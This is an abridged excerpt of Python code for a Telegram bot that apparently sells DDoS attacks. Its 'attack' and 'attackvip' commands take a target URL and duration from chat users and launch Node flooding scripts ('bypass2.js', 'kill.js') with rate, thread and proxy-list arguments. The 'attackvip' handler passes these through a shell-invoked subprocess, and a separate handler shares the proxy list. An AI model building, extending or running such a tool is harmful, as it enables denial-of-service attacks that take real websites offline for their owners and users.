...
async def attack(update: Update, context: CallbackContext):
    ...
    try:
        ...
        command = f"node bypass2.js {url} {duration} {DEFAULT_RATE} {DEFAULT_THREAD} {PROXY_FILE}"
...
async def attackvip(update: Update, context: CallbackContext):
    ...
    try:
        ...
        command = f"node kill.js {url} {duration} 45 15 {VIP_PROXY} {method}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
...
async def proxy(update: Update, context: CallbackContext):
    try:
        with open("huhu.txt", "r") as f:
            lines = [line.strip() for line in f]
        await context.bot.send_message(update.effective_chat.id, f"So luong proxy: {len(lines)}")
        await context.bot.send_document(update.effective_chat.id, open("proxy.txt", "rb"))
